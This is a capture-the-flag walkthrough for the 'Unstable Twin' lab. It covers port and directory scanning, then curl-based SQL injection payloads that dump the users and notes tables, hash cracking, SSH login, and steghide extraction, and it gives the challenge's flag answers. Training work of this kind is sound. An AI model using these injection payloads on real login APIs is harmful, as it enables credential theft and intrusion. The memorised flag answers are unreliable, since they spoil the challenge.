<p>June 26, 2025</p>
<h1>Unstable Twin</h1>
<p>A Services based room, extracting information from HTTP Services and finding the hidden messages.</p>

<br>

<h2>Task 1 . Unstable Twin</h2>
<p>Based on the Twins film, find the hidden keys.

Julius and Vincent have gone into the SERVICES market to try and get the family back together.<br>
They have just deployed a new version of their code, but Vincent has messed up the deployment!<br>

Can you help their mother find and recover the hidden keys and bring the family and girlfriends back together?</p>

<p>1.1. What is the build number of Vincent's server?<br>
<code>1.3.4-dev</code></p>

<br>

<p>1.2. What is the build number of Vincent's server?<br>
<code>Nay</code></p>

<br>

<p>1.3. How many users are there?<br>
<code>5</code></p>

<br>

<p>1.4. What colour is Vincent?<br>
<code>Orange</code></p>

<br>

<p>1.5. What is Mary Ann's SSH password<br>
<code>experiment</code></p>

<br>

<p>1.6. User Flag<br>
<code>THM{Mary_Ann_notes}</code></p>

<br>

<p>1.7. <p>Final Flag<br>
<code>THM{The_Family_Is_Back_Together}</code></p>

<br>
<br>

<h3>Nmap</h3>
<p><code>22/ssh</code> and <code>80/httpngnix 1.14.1</code></p>

```bash
:~# nmap -sC -sV -sS -v unstable.thm
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
...
80/tcp open  http    nginx 1.14.1
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: nginx/1.14.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
...
```

<h3>ffuf</h3>

```bash
:~# ffuf -u http://unstabletwin.thm/FUZZ -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
...
info                    [Status: 200, Size: 160, Words: 31, Lines: 2]
```

```bash
:~# ffuf -u http://unstabletwin.thm/FUZZ -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -X POST
...
api                     [Status: 405, Size: 178, Words: 20, Lines: 5]
info                    [Status: 405, Size: 178, Words: 20, Lines: 5]
```

```bash
:~# ffuf -u http://unstabletwin.thm/api/FUZZ -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
...
login                   [Status: 405, Size: 178, Words: 20, Lines: 5]
```

<h3>unstable.thm/info</h3>

![image](https://github.com/user-attachments/assets/2350a1aa-51f7-4e7a-a05f-3562e7df76f5)


<h3>curl</h3>

```bash
:~# curl -v http://unstabletwin.thm/info
...
* TCP_NODELAY set
* Connected to unstabletwin.thm (TargetIP) port 80 (#0)
> GET /info HTTP/1.1
> Host: unstabletwin.thm
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.14.1
< Date: Thu, 26 Jun 2025 ...
< Content-Type: application/json
< Content-Length: 160
< Connection: keep-alive
< Build Number: 1.3.4-dev
< Server Name: Vincent
< 
"The login API needs to be called with the username and password form fields fields.  It has not been fully tested yet so may not be full developed and secure"
* Connection #0 to host unstabletwin.thm left intact
```

```bash
:~# curl -X POST http://unstabletwin.thm/api/login
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
    <head>
        <title>The page is temporarily unavailable</title>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <style type="text/css">
            /*<![CDATA[*/
            body {
...
```

```bash
:~# curl -X POST http://unstabletwin.thm/api/login -d "username=admin&password=password"
^C
```

```bash
root@ip-10-10-144-230:~# curl -X POST http://unstabletwin.thm/api/login -d "username=admin&password=password"
[]
```

<p>The same Request generate different Response!</p>

```bash
:~# curl -X POST http://unstabletwin.thm/api/login -d "username=' UNION SELECT 1,sqlite_version()--&password=password"
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
    <head>
        <title>The page is temporarily unavailable</title>
```

```bash
:~# curl -X POST http://unstabletwin.thm/api/login -d "username=' UNION SELECT 1,sqlite_version()--&password=password"
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
    <head>
        <title>The page is temporarily unavailable</title>
```

```bash
:~# curl -X POST http://unstabletwin.thm/api/login -d "username=admin' UNION SELECT 1,sqlite_version(); -- -&password=admin"
[
  [
    1, 
    "3.26.0"
  ]
]
```

```bash
:~# curl -X POST http://unstabletwin.thm/api/login -d "username=admin' UNION SELECT 1,tbl_name FROM sqlite_master; -- -&password=admin"
[
  [
    1, 
    "notes"
  ], 
  [
    1, 
    "sqlite_sequence"
  ], 
  [
    1, 
    "users"
  ]
]
```

<p><code>Vincent</code> : <code>Orange</code></p>
<p>5 users: julias, linda, marnie, mary_ann and vincent</p>

```bash
:~# curl -X POST http://unstabletwin.thm/api/login -d "username=admin' UNION SELECT username,password FROM users; -- -&password=admin"
[
  [
    "julias", 
    "Red"
  ], 
  [
    "linda", 
    "Green"
  ], 
  [
    "marnie", 
    "Yellow "
  ], 
  [
    "mary_ann", 
    "continue..."
  ], 
  [
    "vincent", 
    "Orange"
  ]
]
```

```bash
:~# curl -X POST http://unstabletwin.thm/api/login -d "username=admin' UNION SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'; -- -&password=admin"
[
  [
    1, 
    "users,notes"
  ]
]
```

```bash
:~# curl -X POST http://unstabletwin.thm/api/login -d "username=admin' UNION SELECT 1,(SELECT sql FROM sqlite_master WHERE tbl_name='users'); -- -&password=admin"
[
  [
    1, 
    "CREATE TABLE \"users\" (\n\t\"id\"\tINTEGER UNIQUE,\n\t\"username\"\tTEXT NOT NULL UNIQUE,\n\t\"password\"\tTEXT NOT NULL UNIQUE,\n\tPRIMARY KEY(\"id\" AUTOINCREMENT)\n)"
  ]
]
```

```bash
:~# curl -X POST http://unstabletwin.thm/api/login -d "username=admin' UNION SELECT 1,(SELECT sql FROM sqlite_master WHERE tbl_name='notes'); -- -&password=admin"
[
  [
    1, 
    "CREATE TABLE \"notes\" (\n\t\"id\"\tINTEGER UNIQUE,\n\t\"user_id\"\tINTEGER,\n\t\"note_sql\"\tINTEGER,\n\t\"notes\"\tTEXT,\n\tPRIMARY KEY(\"id\")\n)"
  ]
]

```

<p><code>mary_ann</code></p>

```bash
:~# curl -X POST http://unstabletwin.thm/api/login -d "username=admin' UNION SELECT 1,(SELECT username || ':' || password FROM users LIMIT 1 OFFSET 0); -- -&password=admin"
[
  [
    1, 
    "mary_ann:continue..."
  ]
]
```

```bash
:~# curl -X POST http://unstabletwin.thm/api/login -d "username=admin' UNION SELECT 1,group_concat(notes) from notes; -- -&password=admin"
[
  [
    1, 
    "I have left my notes on the server.  They will me help get the family back together. ,My Password is eaf0651dabef9c7de8a70843030924d335a2a8ff5fd1b13c4cb099e66efe25ecaa607c4b7dd99c43b0c01af669c90fd6a14933422cf984324f645b84427343f4\n"
  ]
]
```

<h3>CrackStation</h3>
<p><code>experiment</code></p>

![image](https://github.com/user-attachments/assets/ac6e8272-668f-4b8a-9eec-065e07916c4a)

<h3>User Flag</h3>

```bash
:~# ssh mary_ann@TargetIP
...
Hello Mary Ann
[mary_ann@UnstableTwin home]$ cd mary_ann
[mary_ann@UnstableTwin ~]$ ls -lah
total 24K
drwx------. 3 mary_ann mary_ann 138 Feb 13  2021 .
drwxr-xr-x. 3 root     root      22 Feb 13  2021 ..
-rw-------. 1 mary_ann mary_ann 115 Feb 13  2021 .bash_history
-rw-r--r--. 1 mary_ann mary_ann  18 Jul 21  2020 .bash_logout
-rw-r--r--. 1 mary_ann mary_ann 141 Jul 21  2020 .bash_profile
-rw-r--r--. 1 mary_ann mary_ann 424 Feb 13  2021 .bashrc
drwx------. 2 mary_ann mary_ann  44 Feb 13  2021 .gnupg
-rw-r--r--. 1 mary_ann mary_ann 219 Feb 13  2021 server_notes.txt
-rw-r--r--. 1 mary_ann mary_ann  20 Feb 13  2021 user.flag
[mary_ann@UnstableTwin ~]$ cat server_notes.txt
Now you have found my notes you now you need to put my extended family together.

We need to GET their IMAGE for the family album.  These can be retrieved by NAME.

You need to find all of them and a picture of myself!
[mary_ann@UnstableTwin ~]$ cat user.flag
THM{Mary_Ann_notes}
```

<h3>/opt/unstable</h3>

```bash
[mary_ann@UnstableTwin ~]$ cd /opt
[mary_ann@UnstableTwin opt]$ ls
unstabletwin
[mary_ann@UnstableTwin opt]$ cd unstabletwin
[mary_ann@UnstableTwin unstabletwin]$ ls
 database.db    __pycache__          Twins-Arnold-Schwarzenegger.jpg   Twins-Danny-DeVito.jpg
 main_5000.py   queries.py           Twins-Bonnie-Bartlett.jpg         Twins-Kelly-Preston.jpg
 main_5001.py  'Twins (1988).html'   Twins-Chloe-Webb.jpg
```

<h3>main_5000.pt</h3>

```bash
[mary_ann@UnstableTwin unstabletwin]$ cat main_5000.py
from flask import Flask, jsonify, request, send_file


app = Flask(__name__)


@app.route('/')
def hello_world():
    return '', 404


@app.route('/api')
def hello_api():
    return '', 404


@app.route('/api/login',  methods=['POST'])
def hello_login():
    d = "The username or password passed are not correct."
    return jsonify(d)


@app.route('/info')
def hello_info():
    d = "The login API needs to be called with the username and password fields.  It has not been fully tested yet " \
        "so may not be full developed and secure"
    return jsonify(d), 200, {'Build Number': '1.3.6-final', 'Server Name': "Julias"}


@app.route('/get_image')
def get_image():
    if request.args.get('name').lower() == 'marnie':
        filename = 'Twins-Kelly-Preston.jpg'
        return send_file(filename, mimetype='image/gif')
    elif request.args.get('name').lower() == 'linda':
        filename = 'Twins-Chloe-Webb.jpg'
        return send_file(filename, mimetype='image/gif')
    elif request.args.get('name').lower() == 'mary_ann':
        filename = 'Twins-Bonnie-Bartlett.jpg'
        return send_file(filename, mimetype='image/gif')
    return '', 404


if __name__ == '__main__':
    app.run(port=5000)
[mary_ann@UnstableTwin unstabletwin]$ 
```

<h3>main_5001.py</h3>

```bash
[mary_ann@UnstableTwin unstabletwin]$ cat main_5001.py
from flask import Flask, g, jsonify, request, send_file
import sqlite3

from queries import test_run_query, run_query

app = Flask(__name__)

DATABASE = '/opt/unstabletwin/database.db'


def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    return db


@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()


@app.route('/')
def hello_world():
    return '', 404


@app.route('/api')
def hello_api():
    return '', 404


@app.route('/api/login',  methods=['POST'])
def hello_login_get():
    username = request.form.get('username')
    password = request.form.get('password')
    db = get_db()
    d = run_query(db, username, password)
    # print(d)
    return jsonify(d)


@app.route('/info')
def hello_info():
    d = "The login API needs to be called with the username and password form fields fields.  " \
        "It has not been fully tested yet so may not be full developed and secure"
    return jsonify(d), 200, {'Build Number': '1.3.4-dev', 'Server Name': "Vincent"}


@app.route('/get_image')
def get_image():
    if request.args.get('name').lower() == 'vincent':
        filename = 'Twins-Danny-DeVito.jpg'
        return send_file(filename, mimetype='image/gif')
    elif request.args.get('name').lower() == 'julias':
        filename = 'Twins-Arnold-Schwarzenegger.jpg'
        return send_file(filename, mimetype='image/gif')
    elif request.args.get('name').lower() == 'mary_ann':
        filename = 'Twins-Bonnie-Bartlett.jpg'
        return send_file(filename, mimetype='image/gif')
    return '', 404

#@app.route('/test')
#def test_api():
#    db = get_db()
#    test_run_query(db)
#    return '', 404


if __name__ == '__main__':
    app.run(port=5001)
[mary_ann@UnstableTwin unstabletwin]$ 
```

<h3>downloads</h3>

```bash
:~# curl http://unstable.thm/get_image?name=\mary_ann --output mary_ann.jpg
...
:~# curl http://unstable.thm/get_image?name=\vincent --output vincent.jpg
...
:~# curl http://unstable.thm/get_image?name=\julias --output julias.jpg
...
:~# curl http://unstable.thm/get_image?name=\marnie --output marnie.jpg
-
:~# curl http://unstable.thm/get_image?name=\linda --output linda.jpg
-
```

<p>mary_ann</p>

![image](https://github.com/user-attachments/assets/7b914ff0-2261-42d6-ad62-8f7eb1a54782)

<p><code>julias</code></p>

![image](https://github.com/user-attachments/assets/731d4b1c-e6f1-4841-84a9-c2584fac1d92)

<p><code>vincent</code></p>

![image](https://github.com/user-attachments/assets/8452b9bc-d0c7-4754-984e-538730a00769)

<p><code>marnie</code></p>

![image](https://github.com/user-attachments/assets/ac214a8e-0889-4f49-98ef-6ef843543fb1)

<p><code>linda</code></p>

![image](https://github.com/user-attachments/assets/18ee6599-4c0a-44ed-99c0-cc12f22e42ce)


```bash
:~# steghide extract -sf mary_ann.jpeg
Enter passphrase: 
wrote extracted data to "mary_ann.txt".
:~# cat mary_ann.txt
You need to find all my children and arrange in a rainbow!
```

```bash
:~# steghide extract -sf julias.jpg
Enter passphrase: 
wrote extracted data to "julias.txt".
~# cat julias.txt
Red - 1DVsdb2uEE0k5HK4GAIZ
```

```bash
:~# steghide extract -sf vincent.jpg
Enter passphrase: 
wrote extracted data to "vincent.txt".
:~# cat vincent.txt
Orange - PS0Mby2jomUKLjvQ4OSw
```

```bash
:~# steghide --extract -sf linda.jpg
Enter passphrase: 
wrote extracted data to "linda.txt".
:~# cat linda.txt
Green - eVYvs6J6HKpZWPG8pfeHoNG1 
```

```bash
:~# steghide --extract -sf marnie.jpg
Enter passphrase: 
wrote extracted data to "marnie.txt".
:~# cat marnie.txt
Yellow - jKLNAAeCdl2J8BCRuXVX
```

![image](https://github.com/user-attachments/assets/0a0a8d82-1a04-42bd-b4ad-3032760807d6)


<p>
    
- Red = julias = 1DVsdb2uEE0k5HK4GAIZ<br>
- Green = linda = eVYvs6J6HKpZWPG8pfeHoNG1<br>
- Yellow = marnie = jKLNAAeCdl2J8BCRuXVX<br>
- Orange = vincent = PS0Mby2jomUKLjvQ4OSw</p>

<p>Rainbow : Red - Orange - Yellow - Green<br>
    
- 1DVsdb2uEE0k5HK4GAIZ<br>
- PS0Mby2jomUKLjvQ4OSw<br>
- jKLNAAeCdl2J8BCRuXVX<br>
- eVYvs6J6HKpZWPG8pfeHoNG1</p>


![image](https://github.com/user-attachments/assets/c6842e6d-9e3a-4b9a-891c-03cc33da56c4)





